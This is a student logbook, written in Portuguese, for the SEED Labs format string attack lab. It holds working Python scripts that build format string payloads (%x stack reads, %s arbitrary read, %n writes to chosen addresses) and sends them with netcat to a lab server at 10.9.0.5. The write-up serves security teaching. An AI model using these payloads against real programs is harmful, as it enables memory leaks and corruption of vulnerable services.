# SEED Labs - Format String Attack Lab

## Tarefa 1: *Crashar* o Programa

* Em primeiro lugar, iniciamos os *containers* (usando o ficheiro `docker-compose.yml`) com os comandos `dcbuild` e `dcup`

* Para testar a ligação ao servidor no endereço 10.9.0.5, experimentamos correr `echo hello | nc 10.9.0.5 9090` e verificamos que o texto "hello" foi impresso na consola que corria o *container* em que se alojava o servidor

* Para *crashar* o programa, bastou correr o *script* `build_string.py` e fazer `cat badfile | nc 10.9.0.5 9090`

* Isto funcionou porque - ao correr `build_script.py` - foi criado um ficheiro `badfile` cujo conteúdo é uma *string* que, a partir da posição de índice 8, continha 12 `%.8x` seguidos de `%n` (isto é, a *substring* `%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n`) e - ao fazer `cat badfile | nc 10.9.0.5 9090` - o conteúdo desse ficheiro foi enviado para o servidor

* Ora, como o texto enviado para o servidor é diretamente atribuído à *string* de formatação da chamada à função `printf` (`printf(msg)`, de acordo com o código do ficheiro `format.c`), foi aproveitada essa *format string vulnerability* para retirar (e imprimir) 12 elementos da *stack*, sendo que um deles terá sido o endereço de retorno do programa (ou de uma função por ele chamada, como é o caso de `myprintf`), o que terá causado com que este *crashasse*

* A captura de ecrã abaixo comprova que o programa *crashou* (não imprimiu "Returned properly")

![Tarefa 1](/images/logbook7-tarefa1.png)

## Tarefa 2: Imprimir a Memória do Programa do Servidor

### Tarefa 2.A: Dados da *Stack*

* Para imprimir dados da *stack*, são necessários 64 `%x`

* Chegamos a esta conclusão ao editar o ficheiro `build_script.py`, resultando no código abaixo

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x1234567a
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%x" * 64

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* Este código coloca no início do ficheiro `badfile` o número **0x1234567a**, seguido de 64 `%x` - o valor 64 foi obtido experimentalmente através de ajustes/aproximações manuais

* Ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, obtivemos o seguinte resultado do lado do servidor

![Tarefa 2.A](/images/logbook7-tarefa2a.png)

* Ora, o conteúdo impresso termina com o número **0x1234567a** (que tinha sido anteriormente introduzido por nós na *stack*, no início da variável `buf`), o que comprova que foram lidos dados da *stack* através do recurso a 64 especificadores `%x` (63 para retirar/imprimir valores entre a *string* de formatação e o início da variável `buf` e 1 para imprimir o início da variável `buf`)

### Tarefa 2.B: Dados da *Heap*

* De acordo com a informação impressa pelo servidor, o endereço da mensagem secreta armazenada na *heap* é **0x080b4008**

* Ora, para imprimir o conteúdo armazenado num endereço de memória, basta colocar esse endereço de memória na *stack* e usar um especificador `%s` para tentar ler a *string* que se encontra nesse mesmo endereço

* Como tal, em concordância com o valor determinado na tarefa anterior, editamos o ficheiro `build_string.py` para escrever, de forma *little-endian*, o número **0x080b4008** - correspondente ao endereço da mensagem secreta a ler - no início do ficheiro `badfile`, seguindo-o de 63 especificadores `%x` e 1 especificador `%s`, resultando no código seguinte

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%x", concatenated with a "%s"
s = "%x" * 63 + "%s"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* Deste modo, ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, foram impressos 63 valores (em hexadecimal) contidos na *stack*, seguidos da mensagem secreta **"A secret message"**, conforme comprova a captura de ecrã presente abaixo

![Tarefa 2.B](/images/logbook7-tarefa2b.png)

* Esta abordagem resultou porque o especificador `%s`, escrito diretamente na *string* de formatação, fez com que a chamada à função `printf` imprimisse o valor armazenado no endereço de memória presente na posição da *stack* correspondente ao especificador `%s`, isto é, na 64ª posição, que, conforme determinado anteriormente, é o início do conteúdo da variável `buf` (que, neste caso, continha o número/endereço **0x080b4008**)

## Tarefa 3: Modificar a Memória do Programa do Servidor

### Tarefa 3.A: Mudar o valor para um valor diferente

* De acordo com a informação impressa pelo servidor, o endereço da variável a alterar é **0x080e5068**

* Ora, para alterar o conteúdo armazenado num endereço de memória, basta colocar esse endereço de memória na *stack* e usar um especificador `%n` para escrever o número de caracteres impressos até ao momento nesse mesmo endereço

* Então, de forma semelhante ao processo anterior, editamos o ficheiro `build_string.py` para escrever, de forma *little-endian*, o número **0x080e5068** - correspondente ao endereço da variável a alterar - no início do ficheiro `badfile`, seguindo-o de 63 especificadores `%x` e 1 especificador `%n`, resultando no código seguinte

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%x", concatenated with a "%n"
s = "%x" * 63 + "%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* Assim, ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, verificamos que o valor da variável foi alterado de **0x11223344** para **0x000000ec**, tal como comprova a captura de ecrã abaixo

![Tarefa 3.A](/images/logbook7-tarefa3a.png)

* Este método funcionou porque o especificador `%n`, escrito diretamente na *string* de formatação, fez com que a chamada à função `printf` escrevesse o número de caracteres impressos até ao momento no endereço de memória presente na posição da *stack* correspondente ao especificador `%n`, isto é, na 64ª posição, que, conforme determinado anteriormente, é o início do conteúdo da variável `buf` (que, neste caso, continha o número/endereço **0x080e5068**)

### Tarefa 3.B: Mudar o valor para 0x5000

* Nesta tarefa, pretende-se alterar o conteúdo da variável armazenada no endereço **0x080e5068** para **0x5000**

* Ora, tal como explicado anteriormente, o especificador `%n` escreve o número de caracteres impressos até ao momento num endereço de memória, pelo que basta colocar o endereço de memória em questão na posição da *stack* correspondente ao especificador `%n` e, na *string* de formatação, imprimir o número pretendido de caracteres antes de alcançar o `%n`

* Como o número **0x5000** em hexadecimal corresponde a **20480** em decimal, é necessário imprimir 20480 caracteres antes do especificador `%n`

* Tendo em conta que a *string* de formatação tem de conter 63 `%x` (para, conforme determinado inicialmente, retirar os elementos necessários da *stack* até chegar ao início da variável `buf`), é possível alterar o especificador `%x` para `%.325x`, obrigando a que cada valor hexadecimal impresso seja constituído por 325 caracteres, totalizando, assim, 20475 (63 * 325 = 20475) caracteres impressos

* São também impressos os primeiros 4 caracteres da *string* de formatação (correspondentes ao número do endereço de memória no qual se irá escrever), pelo que fica a faltar apenas 1 caracter para totalizar os 20480

* Então, basta acrescentar, por exemplo, um caracter "1" antes dos especificadores `%.325x`, tal como é feito no *script* seguinte

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%.325x", concatenated with a "%n"
s = "1" + "%.325x" * 63 + "%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* De facto, ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, verificamos que o valor da variável foi alterado de **0x11223344** para **0x5000** conforme pretendido, tal como comprova a imagem abaixo

![Tarefa 3.B](/images/logbook7-tarefa3b.png)

* Este processo foi ao encontro do objetivo porque, antes de alcançar o `%n` presente na *string* de formatação, foram impressos 20480 caracteres (o que corresponde a 0x5000, em hexadecimal) e, na posição da *stack* correspondente à posição do especificador `%n` na *string* de formatação, estava o endereço de memória da variável a alterar, isto é, o valor **0x080e5068** estava colocado na 64ª posição da *stack*